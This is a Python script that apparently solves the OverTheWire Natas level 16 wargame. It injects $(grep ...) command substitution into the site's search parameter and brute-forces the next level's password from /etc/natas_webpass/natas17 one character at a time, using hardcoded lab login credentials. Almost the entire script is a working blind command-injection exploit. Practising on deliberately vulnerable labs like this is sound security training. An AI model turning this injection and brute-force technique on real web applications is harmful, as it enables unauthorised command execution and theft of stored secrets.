import requests

base_url = "http://natas16.natas.labs.overthewire.org"
possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

# print('---Getting Password Dictionary---')
# potential_chars = []
# for char in possible_chars:
#     full_url = f'{base_url}?needle=somethings$(grep {char} /etc/natas_webpass/natas17)&submit=Search'

#     r = requests.get(
#         url=full_url,
#         auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
#     )

#     if "somethings" not in r.text:
#         potential_chars.append(char)

# print(f'password dictionary: {potential_chars}')

potential_chars = ['b', 'c', 'd', 'g', 'h', 'k', 'm', 'n', 'q', 'r', 's',
                   'w', 'A', 'G', 'H', 'N', 'P', 'Q', 'S', 'W', '3', '5', '7', '8', '9', '0']
print('---Attempting Brute Force---')
password = ""
for i in range(1, 32):
    for char in potential_chars:
        probe = password + char
        full_url = f'{base_url}?needle=somethings$(grep ^{probe} /etc/natas_webpass/natas17)&submit=Search'

        r = requests.get(
            url=full_url,
            auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
        )

        if "somethings" not in r.text:
            password = probe
            print(password)
